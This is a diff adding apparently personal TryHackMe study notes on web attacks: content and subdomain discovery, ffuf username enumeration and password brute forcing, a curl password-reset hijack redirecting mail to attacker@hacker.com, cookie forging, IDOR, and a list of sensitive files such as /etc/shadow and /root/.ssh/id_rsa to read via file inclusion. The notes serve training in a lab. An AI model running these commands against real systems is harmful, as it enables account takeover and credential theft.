@@ -1,33 +1,437 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>My Blog</title>
-</head>
-<body>
-    <header>
-        <h1>My Blog</h1>
-        <nav>
-            <ul>
-                <li><a href="/">Home</a></li>
-                <li><a href="/about.html">About</a></li>
-                <li><a href="/contact.html">Contact</a></li>
-            </ul>
-        </nav>
-    </header>
-
-    <main>
-        <h2>Welcome to My Blog!</h2>
-        <p>This is the home page for my blog.</p>
-        <ul>
-            <li><a href="/posts/first-post.html">My First Post</a></li>
-            <li><a href="/posts/second-post.html">My Second Post</a></li>
-            <li><a href="/posts/third-post.html">My Third Post</a></li>
-        </ul>
-    </main>
-
-    <footer>
-        <p>Copyright © 2023 My Blog</p>
-    </footer>
-</body>
-</html>
+<h1>Content Discovery</h1>
+<ul>
+<li>
+<h6>Manually</h6>
+<ul>
+<li>
+<p><strong>robots.txt</strong>: Informs search engines which pages are allowed or not allowed to be indexed by them</p>
+</li>
+<li>
+<p><strong>Favicon:</strong> Small personal icon displayed on the address bar. Sometimes the default is left which can be a clue as to what framework the site was built with.
+OWASP has a database of common framework icons to help identify the used framework. https://wiki.owasp.org/index.php/OWASP_favicon_database
+So if a favicon.co is used, you can view the page source, download the favicon with curl, and then check the md5 against the OWASP database.</p>
+</li>
+<li>
+<p><strong>Sitemap.xml</strong>: A list of every file the website owner wants to be listed on a search engine. Sometimes contains old / unused pages that might still work behind the scenes.</p>
+</li>
+<li>
+<p><strong>HTTP Headers:</strong> The server's response headers to a client's requests can contain valuable info, such as:
+The server's software, possible programming language(s) being used.</p>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-http">user@machine$ curl http://10.10.218.78 -v
+*   Trying 10.10.218.78:80...
+* TCP_NODELAY set
+* Connected to MACHINE_IP (MACHINE_IP) port 80 (#0)
+&gt; GET / HTTP/1.1
+&gt; Host: MACHINE_IP
+&gt; User-Agent: curl/7.68.0
+&gt; Accept: */*
+&gt; 
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 200 OK
+&lt; Server: nginx/1.18.0 (Ubuntu)
+&lt; X-Powered-By: PHP/7.4.3
+&lt; Date: Mon, 19 Jul 2021 14:39:09 GMT
+&lt; Content-Type: text/html; charset=UTF-8
+&lt; Transfer-Encoding: chunked
+&lt; Connection: keep-alive
+</code></pre>
+<ul>
+<li>
+<p><strong>Framework Stack</strong>: Once you've established the framework of a website, either from the above favicon example or by looking for clues in the page source such as comments, copyright notices or credits, you can then locate the framework's website. From there, we can learn more about the software and other information, possibly leading to more content we can discover.</p>
+<p>Looking at the page source of our Acme IT Support website (<a href="http://10.10.218.78/">http://10.10.218.78</a>), you'll see a comment at the end of every page with a page load time and also a link to the framework's website, which is <a href="https://static-labs.tryhackme.cloud/sites/thm-web-framework">https://static-labs.tryhackme.cloud/sites/thm-web-framework</a>. Let's take a look at that website. Viewing the documentation page gives us the path of the framework's administration portal, which gives us a flag if viewed on the Acme IT Support website.</p>
+</li>
+<li>
+<h6>Automated</h6>
+<ul>
+<li>Self explanatory, done through scripts and tools that rely on wordlists or additional user-given parameters.
+Typical tools include ffuf, dirb, gobuster, etc. Most common wordlist for content discovery is apparently seclists by Daniel Miessler</li>
+</ul>
+</li>
+<li>
+<h6>OSINT</h6>
+<ul>
+<li>Google Dorks: advanced search engine options
+![[Pasted image 20220628190526.png]]</li>
+</ul>
+<ul>
+<li>
+<p><strong>Wappalyzer:</strong> Wappalyzer (<a href="https://www.wappalyzer.com/">https://www.wappalyzer.com/</a>) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.</p>
+</li>
+<li>
+<p><strong>Wayback Machine:</strong> The Wayback Machine (<a href="https://archive.org/web/">https://archive.org/web/</a>) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.</p>
+</li>
+<li>
+<p><strong>Github:</strong> To understand GitHub, you first need to understand Git. Git is a <strong>version control system</strong> that tracks changes to files in a project. Working in a team is easier because you can see what each team member is editing and what changes they made to files. When users have finished making their changes, they commit them with a message and then push them back to a central location (repository) for the other users to then pull those changes to their local machines. GitHub is a hosted version of Git on the internet. Repositories can either be set to public or private and have various access controls. You can use GitHub's search feature to look for company names or website names to try and locate repositories belonging to your target. Once discovered, you may have access to source code, passwords or other content that you hadn't yet found.</p>
+</li>
+<li>
+<p><strong>S3 Buckets</strong>: S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://<strong>{name}.</strong><a href="http://s3.amazonaws.com/"><strong>s3.amazonaws.com</strong></a> where {name} is decided by the owner, such as <a href="http://tryhackme-assets.s3.amazonaws.com">tryhackme-assets.s3.amazonaws.com</a>. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as <strong>{name}</strong>-assets, <strong>{name}</strong>-www, <strong>{name}</strong>-public, <strong>{name}</strong>-private, etc.</p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1>Subdomain Enumeration</h1>
+<p>Subdomain enumeration is the process of finding valid subdomains for a domain, but why do we do this? We do this to expand our attack surface to try and discover more potential points of vulnerability.</p>
+<h2>OSINT - SSL / TLS Certificates</h2>
+<p><strong>SSL/TLS Certificates</strong></p>
+<p>When an SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA's take part in what's called &quot;Certificate Transparency (CT) logs&quot;. These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain, sites like <a href="http://crt.sh">https://crt.sh</a> and <a href="https://transparencyreport.google.com/https/certificates">https://transparencyreport.google.com/https/certificates</a> offer a searchable database of certificates that shows current and historical results.</p>
+<h2>OSINT - Search Engines</h2>
+<p><strong>Search Engines</strong></p>
+<p>Search engines contain trillions of links to more than a billion websites, which can be an excellent resource for finding new subdomains. Using advanced search methods on websites like Google, such as the site: filter, can narrow the search results. For example, &quot;-site:www.domain.com site:*.domain.com&quot; would only contain results leading to the domain name domain.com but exclude any links to www.domain.com; therefore, it shows us only subdomain names belonging to domain.com.</p>
+<p>Go to <a href="https://www.google.com/">Google</a> and use the search term <strong>-site:www.tryhackme.com  site:*.tryhackme.com</strong>, which should reveal a subdomain for tryhackme.com; use that subdomain to answer the question below.</p>
+<h2>DNS Bruteforce</h2>
+<p>Bruteforce DNS (Domain Name System) enumeration is the method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. Because this method requires many requests, we automate it with tools to make the process quicker. In this instance, we are using a tool called dnsrecon to perform this. Click the &quot;View Site&quot; button to open the static site, press the &quot;Run DNSrecon Request&quot; button to start the simulation, and then answer the question below.</p>
+<h2>OSINT - Sublist3r</h2>
+<p><strong>Automation Using Sublist3r</strong></p>
+<p>To speed up the process of OSINT subdomain discovery, we can automate the above methods with the help of tools like <a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a>, click the &quot;View Site&quot; button to open up the static site and run the sublist3r simulation to discover a new subdomain that will help answer the question below.</p>
+<h2>Virtual Hosts</h2>
+<p>Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or <code>c:\windows\system32\drivers\etc\hosts</code> file for Windows users) which maps domain names to IP addresses.</p>
+<p><strong>Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header. We can utilise this host header by making changes to it and monitoring the response to see if we've discovered a new website.</strong></p>
+<p>Like with DNS Bruteforce, we can automate this process by using a wordlist of commonly used subdomains.</p>
+<p><code>ffuf</code></p>
+<pre><code class="language-bash">user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://10.10.196.246
+</code></pre>
+<p>The above command uses the <strong>-w</strong> switch to specify the wordlist we are going to use. The <strong>-H</strong> switch adds/edits a header (in this instance, the Host header), we have the <strong>FUZZ</strong> keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.</p>
+<p>Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the <strong>-fs</strong> switch. Edit the below command replacing {size} with the most occurring size value from the previous result and try it on the AttackBox.</p>
+<p><code>ffuf</code></p>
+<pre><code class="language-bash">user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://10.10.196.246 -fs size
+</code></pre>
+<p>This command has a similar syntax to the first apart from the <strong>-fs</strong> switch, which tells ffuf to ignore any results that are of the specified size.</p>
+<p>The above command should have revealed two positive results that we haven't come across before.</p>
+<h1>Authentication Bypass</h1>
+<h2>Username Enumeration</h2>
+<p>Error messages are very important for testing an application and deciding your approach. By trying out common usernames on a signup page, we can find if the username already exists.
+Then we can modify the request with a username wordlist to fuzz for usernames that are already in use.</p>
+<pre><code class="language-bash">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d &quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.87.214/customers/signup -mr &quot;username already exists&quot;
+</code></pre>
+<p>In the above example, the <code>-w</code> argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The <code>-X</code> argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The <code>-d</code> argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to <strong>FUZZ</strong>. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The <code>-H</code> argument is used for adding additional headers to the request. In this instance, we're setting the <code>Content-Type</code> to the webserver knows we are sending form data. The <code>-u</code> argument specifies the URL we are making the request to, and finally, the <code>-mr</code> argument is the text on the page we are looking for to validate we've found a valid username.</p>
+<hr>
+<h2>Brute Force</h2>
+<p>Using the enumerated usernames as an input wordlist, we can use fuff to now bruteforce a login page with a password wordlist.</p>
+<pre><code class="language-shell">ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d &quot;username=W1&amp;password=W2&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.87.214/customers/login -fc 200
+</code></pre>
+<p>This ffuf command is a little different to the previous one in Task 2. Previously we used the <strong>FUZZ</strong> keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen <code>W1</code> for our list of valid usernames and <code>W2</code> for the list of passwords we will try. The multiple wordlists are again specified with the <code>-w</code> argument but separated with a comma.  For a positive match, we're using the <code>-fc</code> argument to check for an HTTP status code other than 200.</p>
+<p>Running the above command will find a single working username and password combination that answers the question below.</p>
+<hr>
+<h2>Logic Flaw</h2>
+<p>![[Pasted image 20220629212014.png]]</p>
+<ul>
+<li>
+<h6>Logic Flaw Example</h6>
+</li>
+</ul>
+<p>The below mock code example checks to see whether the start of the path the client is visiting begins with /admin and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn't begin with /admin, the page is shown to the client.</p>
+<pre><code class="language-php">if( url.substr(0,6) === '/admin') {
+    # Code to check user is an admin
+} else {
+    # View Page
+}
+</code></pre>
+<p>Because the above PHP code example uses three equals signs <code>(===)</code>, it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting <strong>/adMin</strong> will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.</p>
+<ul>
+<li>
+<h6>Logic Flaw Practical</h6>
+</li>
+</ul>
+<p>Again attempting to enumerate email password reset forms, we can use curl to send POST and GET requests and see what happens.</p>
+<pre><code class="language-shell">$ curl 'http://10.10.87.214/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+</code></pre>
+<p>We use the <code>-H</code> flag to add an additional header to the request. In this instance, we are setting the <code>Content-Type</code> to <code>application/x-www-form-urlencoded</code>, which lets the web server know we are sending form data so it properly understands our request.</p>
+<p>In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable <code>$_REQUEST</code>.</p>
+<p>The PHP <code>$_REQUEST</code> variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.</p>
+<p>So basically what we want to do is send a curl request to reset email for robert, but provide data so that the email reset gets sent to a different email address, like so:</p>
+<pre><code class="language-shell">curl 'http://10.10.87.214/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&amp;email=attacker@hacker.com'
+</code></pre>
+<hr>
+<h2>Cookie Tampering</h2>
+<p>Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges</p>
+<h6>Plain Text</h6>
+<p>The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:</p>
+<p><strong>Set-Cookie: logged_in=true; Max-Age=3600; Path=/</strong><br>
+<strong><strong>Set-Cookie: admin=false; Max-Age=3600; Path=/</strong></strong></p>
+<p>First, we'll start just by requesting the target page:<br>
+Curl Request 1
+<code>user@tryhackme$ curl http://10.10.87.214/cookie-test</code>
+We can see we are returned a message of: <strong>Not Logged In</strong></p>
+<p>Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:<br>
+Curl Request 2
+<code>user@tryhackme$ curl -H &quot;Cookie: logged_in=true; admin=false&quot; http://10.10.87.214/cookie-test</code>
+We are given the message: <strong>Logged In As A User</strong></p>
+<p>Finally, we'll send one last request setting both the logged_in and admin cookie to true:
+Curl Request 3
+<code>user@tryhackme$ curl -H &quot;Cookie: logged_in=true; admin=true&quot; http://10.10.87.214/cookie-test</code>
+This returns the result: <strong>Logged In As An Admin</strong> as well as a flag which you can use to answer question one.</p>
+<h6>Hashing</h6>
+<p>Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. Here are some examples that you may come across:
+![[Pasted image 20220629220114.png]]</p>
+<h6>Encoding</h6>
+<p>Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.</p>
+<p>Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.</p>
+<p>Take the below data as an example which is set by the web server upon logging in:</p>
+<p><code>****Set-Cookie:** session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/**</code></p>
+<p>This string base64 decoded has the value of <strong>{&quot;id&quot;:1,&quot;admin&quot;: false}</strong> we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.</p>
+<p>To crack rudimentary hashes crackstation.net is recommended through THM.</p>
+<h1>IDOR</h1>
+<h2>IDOR Definition</h2>
+<p>IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.</p>
+<p>This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.</p>
+<p>Imagine you've just signed up for an online service, and you want to change your profile information. The link you click on goes to http://online-service.thm/profile?user_id=1305, and you can see your information.</p>
+<p>Curiosity gets the better of you, and you try changing the user_id value to 1000 instead (http://online-service.thm/profile?user_id=1000), and to your surprise, you can now see another user's information. You've now discovered an IDOR vulnerability! Ideally, there should be a check on the website to confirm that the user information belongs to the user logged requesting it.</p>
+<p>Using what you've learnt above, click on the View Site button and try and receive a flag by discovering and exploiting an IDOR vulnerability.</p>
+<hr>
+<h2>IDOR in Encoded IDs</h2>
+<p>When passing data from page to page either by post data, query strings, or cookies, web developers will often first take the raw data and encode it. Encoding ensures that the receiving web server will be able to understand the contents. Encoding changes binary data into an ASCII string commonly using the <code>a-z, A-Z, 0-9 and =</code> character for padding. The most common encoding technique on the web is base64 encoding and can usually be pretty easy to spot. You can use websites like <a href="https://www.base64decode.org/">https://www.base64decode.org/</a> to decode the string, then edit the data and re-encode it again using <a href="https://www.base64encode.org/">https://www.base64encode.org/</a> and then resubmit the web request to see if there is a change in the response.</p>
+<p>See the image below as a graphical example of this process:
+![[Pasted image 20220629222013.png]]</p>
+<hr>
+<h2>IDOR in Hashed IDs</h2>
+<p>Hashed IDs are a little bit more complicated to deal with than encoded ones, but they may follow a predictable pattern, such as being the hashed version of the integer value. For example, the Id number 123 would become 202cb962ac59075b964b07152d234b70 if md5 hashing were in use.</p>
+<p>It's worthwhile putting any discovered hashes through a web service such as <a href="https://crackstation.net/">https://crackstation.net/</a> (which has a database of billions of hash to value results) to see if we can find any matches.</p>
+<hr>
+<h2>IDOR in Unpredictable IDs</h2>
+<p>If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users' content using their Id number while still being logged in with a different account (or not logged in at all), you've found a valid IDOR vulnerability.</p>
+<hr>
+<h2>IDOR Location</h2>
+<p>The vulnerable endpoint you're targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file.</p>
+<p>Sometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to <strong>/user/details</strong> displaying your user information (authenticated through your session). But through an attack known as parameter mining, you discover a parameter called <strong>user_id</strong> that you can use to display other users' information, for example, <strong>/user/details?user_id=123</strong>.</p>
+<hr>
+<h2>IDOR Practical Example</h2>
+<p>Firstly you'll need to log in. To do this, click on the customer's section and create an account. Once logged in, click on the <strong>Your Account</strong> tab.</p>
+<p>The <strong>Your Account</strong> section gives you the ability to change your information such as username, email address and password. You'll notice the username and email fields pre-filled in with your information.</p>
+<p>We'll start by investigating how this information gets pre-filled. If you open your browser developer tools, select the network tab and then refresh the page, you'll see a call to an endpoint with the path /api/v1/customer?id=<code>{user_id}</code>.</p>
+<p>This page returns in JSON format your user id, username and email address. We can see from the path that the user information shown is taken from the query string's id parameter (see below image).<br>
+![[Pasted image 20220629224038.png]]<br>
+You can try testing this id parameter for an IDOR vulnerability by changing the id to another user's id. Try selecting users with IDs 1 and 3 and then answer the questions below.</p>
+<h1>File Inclusion</h1>
+<p>In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. The following graph explains and breaking down the essential parts of the URL.
+![[Pasted image 20220630173736.png]]</p>
+<table class="table table-bordered" style="font-size:1rem"><tbody><tr><td><b><span style="font-family:Ubuntu">Location</span></b></td><td><b><span style="font-family:Ubuntu">Description</span></b><br></td></tr><tr><td><p><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em"><span style="font-size:12px">/etc/issue</span></span></p></td><td><span style="
+font-family:arial, sans-serif;
+text-align:left">contains a message or system identification to be printed before the login prompt.</span><br></td></tr><tr><td><p><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em"><span style="font-size:12px">/etc/profile</span></span></p></td><td><p style="padding:0px;
+border:0px;
+margin-right:0px;
+margin-left:0px;
+font-variant-numeric:inherit;
+font-variant-east-asian:inherit;
+font-stretch:inherit;
+line-height:1.5;
+font-family:&quot;
+IBM Plex Sans&quot;
+, &quot;
+Helvetica Neue&quot;
+, Arial, sans-serif;
+vertical-align:baseline;
+letter-spacing:0px;
+">controls system-wide default variables, such as&nbsp;
+<span style="font-family:inherit;
+font-style:inherit;
+font-variant-ligatures:inherit;
+font-variant-caps:inherit;
+font-weight:inherit;
+letter-spacing:0px;
+font-size:1rem">Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived</span></p></td></tr><tr><td><p><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em"><span style="font-size:12px">/proc/version</span></span></p></td><td><span style=" ;
+font-family:arial, sans-serif;
+text-align:left"><span>specifies the version of the <a class="BNJI8TfO glossary-term" onclick="initPopOver('Linux', 'BNJI8TfO')">Linux</a> kernel</span></span><br></td></tr><tr><td><p><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em"><span style="font-size:12px">/etc/passwd</span></span></p></td><td><span style=" ;
+font-family:arial, sans-serif;
+text-align:left">has all registered user that has access to a system</span><br></td></tr><tr><td><p><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em"><span style="font-size:12px">/etc/shadow</span></span></p></td><td><span style=" ;
+font-family:arial, sans-serif;
+text-align:left">contains information about the system's users' passwords</span><br></td></tr><tr><td><p><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em"><span style="font-size:12px">/root/.bash_history</span></span></p></td><td><p><span style=" ;
+font-family:arial, sans-serif;
+text-align:left">contains the history commands for </span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em">root </span><span style=" ;
+font-family:arial, sans-serif;
+text-align:left">user</span><br></p></td></tr><tr><td><p><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em"><span style="font-size:12px">/var/log/dmessage</span></span></p></td><td><span style=" ;
+font-family:arial, sans-serif;
+text-align:left">contains global system messages, including the messages that are logged during system startup</span><br></td></tr><tr><td><p><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em"><span style="font-size:12px">/var/mail/root</span></span></p></td><td><p>all emails for <span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em">root</span> user</p></td></tr><tr><td><p><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em"><span style="font-size:12px">/root/.ssh/id_rsa</span></span></p></td><td>Private SSH keys for a root or any known valid user on the server</td></tr><tr><td><p><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em"><span style="font-size:12px">/var/log/apache2/access.log</span></span></p></td><td><p>the accessed requests for <span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em">Apache&nbsp;
+</span> webserver</p></td></tr><tr><td><p><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;
+PT Mono&quot;
+, &quot;
+Liberation Mono&quot;
+, Courier, monospace;
+line-height:normal;
+background-color:rgba(135, 131, 120, 0.15);
+color:rgb(235, 87, 87);
+border-top-left-radius:3px;
+border-top-right-radius:3px;
+border-bottom-right-radius:3px;
+border-bottom-left-radius:3px;
+font-size:13.600000381469727px;
+padding:0.2em 0.4em"><span style="font-size:12px">C:\boot.ini</span></span></p></td><td><span style=" ;
+font-family:arial, sans-serif;
+text-align:left">contains the boot options for computers with BIOS firmware</span></td></tr></tbody></table>
+<h1>SSRF</h1>
+<h1>Cross-Site Scripting</h1>
+<h1>Command Injection</h1>
+<h1>SQL Injection</h1>
